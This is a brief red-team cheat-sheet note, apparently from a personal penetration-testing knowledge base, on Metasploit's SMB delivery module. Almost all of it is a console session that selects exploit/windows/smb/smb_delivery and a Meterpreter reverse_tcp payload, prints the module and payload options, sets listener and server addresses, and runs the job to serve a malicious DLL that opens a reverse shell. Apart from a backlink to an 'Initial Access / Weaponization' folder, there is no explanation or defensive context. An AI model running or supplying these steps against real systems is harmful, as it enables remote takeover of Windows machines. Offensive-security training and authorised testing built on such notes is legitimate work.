# SMB Delivery

```
msf > use exploit/windows/smb/smb_delivery

msf exploit(windows/smb/smb_delivery) > set payload windows/x64/meterpreter/reverse_tcp

msf exploit(windows/smb/smb_delivery) > options

Module options (exploit/windows/smb/smb_delivery):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   FILE_NAME    test.dll         no        DLL file name
   FOLDER_NAME                   no        Folder name to share (Default none)
   SHARE                         no        Share (Default Random)
   SRVHOST      0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen
                                            on all addresses.
   SRVPORT      445              yes       The local port to listen on.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   DLL


msf exploit(windows/smb/smb_delivery) > set lhost <IP>

msf exploit(windows/smb/smb_delivery) > set lport <PORT>

msf exploit(windows/smb/smb_delivery) > set srvhost <server_IP>

msf exploit(windows/smb/smb_delivery) > set srvport <server_PORT>

msf exploit(windows/smb/smb_delivery) > run -j
```

---
## References

### Backlinks

- [[06 - Tactics & Techniques & Procedures Phases/C - Initial Access/0x01 - Weaponization/0xC - Client-Side Attacks/Delivery Methods/Command and Scripting Interpreter/Desktop/Windows/PE Execution/DLL/Manual]]